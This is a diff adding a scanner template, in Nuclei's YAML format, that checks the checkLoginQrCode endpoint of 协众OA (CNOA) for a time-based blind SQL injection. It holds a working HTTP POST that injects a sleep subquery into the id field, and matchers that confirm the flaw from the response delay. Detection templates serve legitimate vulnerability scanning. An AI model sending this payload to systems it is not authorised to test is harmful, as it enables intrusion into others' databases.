@@ -1,0 +1,37 @@
+id: poc-yaml-cnoa-checkloginqrcode-sqli
+info:
+  name: 协众OA checkLoginQrCode SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in 协众OA checkLoginQrCode endpoint.
+
+variables:
+  t1: '{{rand_int(4,9)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        POST /index.php?app=main&func=common&action=commonJob&act=checkLoginQrCode HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        id=(select * from (select sleep({{t1}}))z)
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{"failure":true,"msg":1}'
+      - type: word
+        part: header
+        words:
+          - 'CNOA'
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'duration > to_number(t1)'
+          - 'duration < to_number(t2)'
